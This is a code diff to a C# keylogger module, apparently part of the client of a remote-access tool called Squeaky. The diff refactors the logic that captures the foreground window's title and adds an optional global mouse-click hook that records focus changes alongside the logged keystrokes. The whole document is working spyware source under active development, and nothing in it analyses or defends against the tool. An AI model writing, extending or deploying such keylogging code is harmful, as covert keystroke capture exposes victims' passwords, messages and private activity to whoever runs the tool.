@@ -49,14 +49,22 @@ namespace Squeaky.Client.Utilities
             }
         }
 
-        private static void OnKeyDown(object sender, KeyEventArgs e)
+        private static bool CheckWindowName()
         {
             var activewindowtitle = KeyLoggerHelper.GetForegroundWindowTitle();
             if (!string.IsNullOrEmpty(activewindowtitle) && activewindowtitle != LastWindowTitle)
             {
                 LastWindowTitle = activewindowtitle;
                 LogBuffer.Append($"{(FirstLine ? "" : "\n\n")}[{activewindowtitle}] [{DateTime.Now.ToString("hh:mm:ss")}]\n");
+                return true;
             }
+
+            return false;
+        }
+
+        private static void OnKeyDown(object sender, KeyEventArgs e)
+        {
+            CheckWindowName();
 
             if (!KeyLoggerHelper.IsExcludedKey(e.KeyCode) && !PressedKeys.Contains(e.KeyCode))
             {
@@ -85,6 +93,11 @@ namespace Squeaky.Client.Utilities
             }
         }
 
+        private static void OnMouseClick(object sender, MouseEventArgs e)
+        {
+            if (CheckWindowName()) LogBuffer.Append("[MouseFocus]\n");
+        }
+
         public static void Start()
         {
             if (Settings.LOGGER)
@@ -93,6 +106,7 @@ namespace Squeaky.Client.Utilities
                 hook.KeyDown += OnKeyDown;
                 hook.KeyUp += OnKeyUp;
                 hook.KeyPress += OnKeyPress;
+                if (Settings.LOGMOUSEFOCUS) hook.MouseClick += OnMouseClick;
 
                 Thread WriteLoopThread = new Thread(WriteLoop);
                 WriteLoopThread.Start();
